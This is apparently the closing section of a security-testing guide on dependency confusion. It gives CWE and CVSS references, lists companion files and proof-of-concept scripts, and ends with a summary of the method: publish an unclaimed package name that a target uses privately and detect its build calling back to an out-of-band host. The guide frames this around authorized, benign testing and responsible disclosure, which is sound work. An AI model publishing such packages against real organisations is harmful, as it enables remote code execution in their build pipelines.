- **CWE-829** (Inclusion of Functionality from an Untrusted Control Sphere): https://cwe.mitre.org/data/definitions/829.html · **CWE-427** (Uncontrolled Search Path Element) · **CWE-494** (Download of Code Without Integrity Check) · **CWE-1357** (Reliance on Insufficiently Trustworthy Component).
- **CVSS 3.1** calculator (CI/CD RCE ≈ 9+): https://www.first.org/cvss/calculator/3.1

---

## Companion files
- **[DEPENDENCY_CONFUSION_ARSENAL.md](DEPENDENCY_CONFUSION_ARSENAL.md)** — recon sources, per-ecosystem claimability queries, benign-beacon templates, tools.
- **[DEPENDENCY_CONFUSION_CHECKLIST.md](DEPENDENCY_CONFUSION_CHECKLIST.md)** — phase-by-phase + auto-reject + responsible-disclosure gate.
- **[DEPENDENCY_CONFUSION_REPORT_TEMPLATE.md](DEPENDENCY_CONFUSION_REPORT_TEMPLATE.md)** — report skeleton (claimability + benign-callback proof).
- **[DependencyConfusion_Zero_to_Expert.md](DependencyConfusion_Zero_to_Expert.md)** — 100-question study + field reference.
- **[poc/](poc/)** — `manifest_scan.py` (extract dep names) · `claimable_check.py` (public-registry 404 check) · `benign_callback_pkg.py` (generate a benign beacon package skeleton — does NOT publish).

> **Final reminder — the one rule that pays:** dependency confusion is confirmed when the target's **build calls back to your OOB host** from a package **you published under a name they use privately but never claimed** — and the whole proof is a **benign beacon** (hostname + token), published for an **authorized** name, **unpublished** the moment it fires, and reported so they can reserve the namespace. Detect widely, publish narrowly and benignly, and report the **CI/CD RCE** — never the payload you didn't need.
